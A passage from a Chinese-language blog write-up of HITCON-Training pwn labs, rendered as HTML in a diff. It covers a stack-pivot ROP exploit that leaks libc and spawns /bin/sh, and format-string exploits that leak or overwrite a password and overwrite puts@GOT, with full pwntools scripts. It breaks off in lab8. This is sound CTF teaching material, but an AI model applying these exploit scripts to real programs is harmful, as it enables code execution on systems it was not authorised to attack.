class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
+
+<p>是一个溢出的题目。ida查看程序逻辑：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( count != <span class="number">1337</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  ++count;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try your best :&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>安全措施主要是开启了栈不可执行保护。根据ida的反编译结果很容易看出这是一个栈溢出的题目，并且可以构造ROP的溢出大小=0x40-0x28-0x4(ebp)=20字节，这个长度显然不够构造ROP chain的，而且开头还通过count进行了main执行次数限制，防止多次ROP。由此需要用到栈迁移(当然分析是这样，其实名字已经很明显了)。</p>
+<p>栈迁移相比一般栈溢出的话，特点是一般做了些限制(from ctf-wiki)：</p>
+<ul>
+<li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li>
+<li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域</li>
+<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li>
+</ul>
+<p>在有限的栈溢出空间插入修改esp的指针(如gadget<code>pop esp; ret</code>),将栈迁移到部署了ROP的内存地址，进行ROP。原理图如下：</p>
+<p><img src="/images/hitcon_training/stack_pivot.png" alt="stack_pivot"></p>
+<p>下面具体针对这题。首先需要将栈转移到已知地址，这里选择<code>bss+0x300</code>地址处,尽量避免覆盖掉程序的data、got、bss等segment的信息防止crash，调用read函数写入gadget，并且为了保持控制权，最后要返回到<code>bss+0x300</code>处。这段的payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload1 = flat([<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>,bss_addr+<span class="number">0x300</span>,read_plt,leave_ret,<span class="number">0</span>,bss_addr+<span class="number">0x300</span>,<span class="number">100</span>])</span><br><span class="line"><span class="comment">#&quot;a&quot;*0x28 -&gt; junk</span></span><br><span class="line"><span class="comment"># bss_addr+0x300 -&gt; fake_ebp</span></span><br><span class="line"><span class="comment"># read_plt -&gt; call read</span></span><br><span class="line"><span class="comment">#leave_ret -&gt;消耗掉0 并且ret to bss_addr+0x100</span></span><br><span class="line"><span class="comment"># 0,bss_addr+0x300,100 -&gt; read 参数</span></span><br></pre></td></tr></table></figure>
+
+<p>之后我们便已经获得了一个更大的溢出空间(也就是read的100B)。</p>
+<p>接下来我们需要泄露出libc地址，这里可以是puts也可以是read的地址，通过puts函数打印出其got表值即其地址，并且完成后依然要继续维持控制权。这里防止read覆盖掉后续栈内存，需要再开一个新的栈空间<code>bss+0x600</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload2 = flat([bss_addr+<span class="number">0x600</span>,puts_plt,pop_ret,puts_got,read_plt,leave_ret,<span class="number">0</span>,bss_addr+<span class="number">0x600</span>,<span class="number">100</span>])</span><br><span class="line"><span class="comment">#bss_addr+0x600 -&gt; leave用来设置ebp(mov esp,ebp;pop ebp</span></span><br><span class="line"><span class="comment">#        -&gt;ebp = bss_addr+0x600; esp = bss_addr+0x300 )</span></span><br><span class="line"><span class="comment"># puts_plt -&gt; call puts</span></span><br><span class="line"><span class="comment"># pop_ret -&gt; 消耗掉puts_got</span></span><br><span class="line"><span class="comment"># puts_got -&gt; puts泄露的puts_got表项值，即libc中puts地址</span></span><br><span class="line"><span class="comment"># read_plt,leave_ret,0,bss_addr+0x600,100 -&gt; 同payload1 再次获得控制权并读入数据到一个新栈地址</span></span><br></pre></td></tr></table></figure>
+
+<p>这样之后便得到了libc中puts函数地址，根据libc基址对齐以及puts偏移得到libc版本信息，计算出<code>system</code>函数地址，跳转执行(为了防止read覆盖再次切换栈位置，两个栈反复横跳即可，当然也可以再开一个新栈)：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload3 = flat([bss_addr+<span class="number">0x300</span>,system_addr,<span class="number">0</span>,bss_addr+<span class="number">0x600</span>+<span class="number">4</span>*<span class="number">4</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>])</span><br><span class="line"><span class="comment">#bss_addr+0x300 -&gt; 同payload2</span></span><br><span class="line"><span class="comment">#system_addr -&gt; ret to system</span></span><br><span class="line"><span class="comment"># 0 -&gt; system调用时内存布局的占位junk数据</span></span><br><span class="line"><span class="comment"># bss_addr+0x600+4*4 -&gt; &quot;/bin/sh&quot;地址</span></span><br><span class="line"><span class="comment">#&quot;/bin/sh&quot; -&gt; system参数</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>writeup</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./migration&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./migration&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x804a000</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">pop_ret = <span class="number">0x0804836D</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = flat([<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>,bss_addr+<span class="number">0x300</span>,read_plt,leave_ret,<span class="number">0</span>,bss_addr+<span class="number">0x300</span>,<span class="number">100</span>])</span><br><span class="line">p.recvuntil(<span class="string">&quot;Try your best :\n&quot;</span>)</span><br><span class="line"><span class="comment">#input()#debug</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">payload2 = flat([bss_addr+<span class="number">0x600</span>,puts_plt,pop_ret,puts_got,read_plt,leave_ret,<span class="number">0</span>,bss_addr+<span class="number">0x600</span>,<span class="number">100</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:<span class="number">4</span>])</span><br><span class="line"><span class="comment">#print(&quot;puts addr: &quot;,hex(puts_addr))</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - obj.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="comment">#print(&quot;libc addr: &quot;,hex(libc_base))</span></span><br><span class="line">system_addr = libc_base +  obj.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"><span class="comment">#print(&quot;system addr: &quot;,hex(system_addr))</span></span><br><span class="line">payload3 = flat([bss_addr+<span class="number">0x300</span>,system_addr,<span class="number">0</span>,bss_addr+<span class="number">0x600</span>+<span class="number">4</span>*<span class="number">4</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>])</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这题主要需要注意的细节就是read不要覆盖了不能覆盖的数据，以及puts函数会额外输出一个”\n”总是搞忘:=。</p>
+<h3 id="lab7"><a href="#lab7" class="headerlink" title="lab7"></a>lab7</h3><p>题目信息如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@4177d9af:/ctf/work/lab7<span class="comment"># file ./crack</span></span><br><span class="line">./crack: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=66ea82f29539f0da4643036bca734fcd9b4791f9, not stripped</span><br><span class="line">root@4177d9af:/ctf/work/lab7<span class="comment"># checksec ./crack</span></span><br><span class="line">[*] Checking <span class="keyword">for</span> new versions of pwntools</span><br><span class="line">    To <span class="built_in">disable</span> this functionality, <span class="built_in">set</span> the contents of /root/.pwntools-cache-3.6/update to <span class="string">&#x27;never&#x27;</span>.</span><br><span class="line">[*] A newer version of pwntools is available on pypi (4.0.1 --&gt; 4.2.1).</span><br><span class="line">    Update with: $ pip install -U pwntools</span><br><span class="line">[*] <span class="string">&#x27;/ctf/work/lab7/crack&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">root@4177d9af:/ctf/work/lab7<span class="comment"># ./crack</span></span><br><span class="line">What your name ? %p%p</span><br><span class="line">Hello ,0xff98c8580x63</span><br><span class="line">Your password :aaaaaaaa</span><br><span class="line">Goodbyte</span><br></pre></td></tr></table></figure>
+
+<p>一个动态链接的crack小程序，包含一个格式化字符串漏洞。用ida反编译,main反编译结果如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+18h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;password, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What your name ? &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello ,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your password :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == password )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congrt!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /home/crack/flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Goodbyte&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序大致意思很明显，运行时获取随机password值，回答正确即可分支跳转到获取flag代码。</p>
+<p>格式化字符串的大致原理之前有做过简单的研究，见<a target="_blank" rel="noopener" href="https://www.sec4.fun/2018/04/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">格式化字符串漏洞</a>。对于这个程序也不涉及到获取变量，只需要通过%x打印出对应位置的数据即可，使用gdb进行调试，断在<code>printf(&amp;buf)</code>，即0x80486C1。</p>
+<p>原理是原理，工具是工具，用pwntools直接生成payload比手动计算偏移可轻松太多了。主要是三个思路</p>
+<ul>
+<li>泄露passwd</li>
+<li>修改passwd</li>
+<li>修改puts_got到执行system那条语句地址</li>
+</ul>
+<p><strong>writeup</strong></p>
+<p>下面分别看下这三个思路。</p>
+<p>泄露和修改passwd基本相似</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改password</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwd_addr = <span class="number">0x804a048</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;pwd_addr:<span class="number">6</span>&#125;)<span class="comment">#利用fmtstr_payload生成payload</span></span><br><span class="line"><span class="comment">#第一个参数表示格式化字符串地址的偏移；</span></span><br><span class="line"><span class="comment">#第二个参数表示需要利用%n写入的数据，采用字典形式，比如要将puts的GOT数据改为system函数地址，&#123;puts_GOT: system_Addr&#125;</span></span><br><span class="line"><span class="comment">#第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；</span></span><br><span class="line"><span class="comment">#第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./crack&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;?&quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak password</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">pwd_addr = <span class="number">0x804a048</span></span><br><span class="line">payload = flat([pwd_addr,<span class="string">&quot;_%10$s__&quot;</span>])</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./crack&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;?&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;_&quot;</span>)</span><br><span class="line">passwd = u32(p.recvuntil(<span class="string">&quot;__&quot;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>,str(passwd))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>修改puts_got方法的脚本其实和修改passwd一样，只是换了修改的地址而已。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#write puts_got</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">puts_got = <span class="number">0x804a01c</span></span><br><span class="line">system_path = <span class="number">0x804872b</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./crack&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;puts_got:system_path&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;?&quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="浅谈fmtstr-payload使用"><a href="#浅谈fmtstr-payload使用" class="headerlink" title="浅谈fmtstr_payload使用"></a>浅谈fmtstr_payload使用</h4><p>可以看到exp中有使用<code>fmtstr_payload(10,&#123;pwd_addr:6&#125;)</code>这样生成payload,这里说一下<code>fmtstr_payload</code>的简单使用. <code>fmtstr_payload</code>文档如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from context.bits</span><br><span class="line"></span><br><span class="line">The overflows argument is a format-string-length to output-amount tradeoff: Larger values for overflows produce shorter format strings that generate more output at runtime.</span><br><span class="line"></span><br><span class="line">    Parameters:	</span><br><span class="line">        offset (int) – the first formatter’s offset you control</span><br><span class="line">        writes (dict) – dict with addr, value &#123;addr: value, addr2: value2&#125;</span><br><span class="line">        numbwritten (int) – number of byte already written by the printf function</span><br><span class="line">        write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)</span><br><span class="line">        overflows (int) – how many extra overflows (at size sz) to tolerate to reduce the length of the format string</span><br><span class="line">        strategy (str) – either ‘fast’ or ‘small’ (‘small’ is default, ‘fast’ can be used if there are many writes)</span><br><span class="line">        Returns:	</span><br><span class="line">        The payload in order to do needed writes</span><br></pre></td></tr></table></figure>
+
+<p>平时做pwn主要用到的就是前2个参数：</p>
+<ul>
+<li><strong>offset</strong>：第一个格式化字符存放的位置偏移。<ul>
+<li>如何得到这个偏移，其实最简单的就是直接%X打印栈，如下</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@34c8834f:&#x2F;ctf&#x2F;work&#x2F;lab7# .&#x2F;crack</span><br><span class="line">What your name ? aaaa.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X</span><br><span class="line">Hello ,aaaa.FFAD7FC8.63.0.F7FA3A9C.3.F7F75410.1.0.1.61616161.2E58252E.252E5825.58252E58.2E58252E</span><br><span class="line">����H���Your password :11</span><br><span class="line">Goodbyte</span><br></pre></td></tr></table></figure>
+
+<p>格式化字符串第一个字符aaaa其位置通过不停的打印栈可以得到在偏移10(0xa)位置出现，偏移以0开始，便可以直接得到此参数为10。</p>
+<ul>
+<li><strong>writes</strong>：一个字典，用来写数据，以 {addr: value, addr2: value2,…}将value写入addr位置。</li>
+<li>numbwritten：如果printf前面还有打印的字符，就需要设置这个参数</li>
+<li>write_size：写入的大小，是每次单字节写入，还是一次写入双字节，还是一次写入四个字节。</li>
+</ul>
+<p>下面看一下fmtstr_payload生成的payload，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@34c8834f:&#x2F;ctf&#x2F;work&#x2F;lab7# python3</span><br><span class="line">Python 3.6.9 (default, Nov  7 2019, 10:44:02)</span><br><span class="line">[GCC 8.3.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; puts_got &#x3D; 0x804a01c</span><br><span class="line">&gt;&gt;&gt; system_path &#x3D; 0x804872b</span><br><span class="line">&gt;&gt;&gt; fmtstr_payload(10,&#123;puts_got:system_path&#125;)</span><br><span class="line">b&#39;%8c%19$hhn%35c%20$hhn%1116c%21$hnaaa\x1f\xa0\x04\x08\x1c\xa0\x04\x08\x1d\xa0\x04\x08&#39;</span><br></pre></td></tr></table></figure>
+
+<p>这段payload作用是将值0x804872b写入地址0x804a01c。首先fmtstr_payload将这个值拆成了三个部分：<code>0x2b</code>,<code>0x0487</code>,<code>0x8</code>依次放入0x804a01c至0x804a01f。</p>
+<ul>
+<li><p>对于0x8,根据给出的偏移(10)与最后生成的格式化字符中目标地址存放位置的偏移(9)相加得到%19$n，并且写入格式为字节，所以最后得到**%8c%19$hhn**</p>
+</li>
+<li><p>对于0x2b,根据给出的偏移(10)与最后生成的格式化字符中目标地址存放位置的偏移(10)相加得到%20$n,并且写入格式为字节，所以最后得到**%20$hhn**,而前面已经输出了0x8，这里只需要再写入35个字符便得到，所以最后为**%35c%20$hhn**</p>
+</li>
+<li><p>同理，0x487=1116+35+8，偏移为21-&gt;<strong>%1116c%21$hhn</strong></p>
+</li>
+<li><p>最后aaa用来对齐</p>
+</li>
+</ul>
+<p>pwntools的<code>fmtstr</code>模块函数比较多，后续会专门看一下其他的功能以及这个模块的实现。</p>
+<h3 id="lab8"><a href="#lab8" class="headerlink" title="lab8"></a>lab8</h3><p>题目基本信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@34c8834f:&#x2F;ctf&#x2F;work&#x2F;lab8# file .&#x2F;craxme</span><br><span class="line">.&#x2F;craxme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;2b264eb7dfa7fe74e2dce2cf802a6b5300737b65, not stripped</span><br><span class="line">root@34c8834f:&#x2F;ctf&#x2F;work&#x2F;lab8# checksec .&#x2F;craxme</span><br><span class="line">[*] &#39;&#x2F;ctf&#x2F;work&#x2F;lab8&#x2F;craxme&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">root@34c8834f:&#x2F;ctf&#x2F;work&#x2F;lab8# .&#x2F;craxme</span><br><span class="line">Please crax me !</span><br><span class="line">Give me magic :aaaa%x</span><br><span class="line">aaaaffe8ac5c</span><br><span class="line">�����You need be a phd</span><br></pre></td></tr></table></figure>
+
+<p>ida反编译：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please crax me !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me magic :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);<span class="comment">//&lt;- bug here</span></span><br><span class="line">  <span class="keyword">if</span> ( magic == <span class="number">0xDA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;cat /home/craxme/flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( magic == <span class="number">0xFACEB00C</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;cat /home/craxme/craxflag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You need be a phd&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也是一个格式化字符串的题目。读入buf后直接通过printf打印。</p>
